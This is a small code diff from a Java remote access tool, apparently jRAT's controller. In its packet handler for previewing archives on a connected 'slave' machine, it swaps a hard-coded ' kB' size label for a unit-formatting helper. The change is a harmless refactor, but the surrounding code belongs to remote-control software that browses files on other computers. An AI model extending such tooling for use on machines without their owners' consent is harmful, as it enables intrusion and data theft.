@@ -7,6 +7,7 @@ import javax.swing.Icon;
 import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.FramePreviewZip;
 import se.jrat.client.utils.IconUtils;
+import se.jrat.common.utils.DataUnits;
 
 
 public class Packet45ArchivePreview extends AbstractIncomingPacket {
@@ -15,7 +16,7 @@ public class Packet45ArchivePreview extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		boolean dir = slave.readBoolean();
 		String name = slave.readLine();
-		String filesize = slave.readLong() + " kB";
+		String filesize = DataUnits.getAsString(slave.readLong());
 
 		FramePreviewZip frame = FramePreviewZip.instances.get(slave);
 
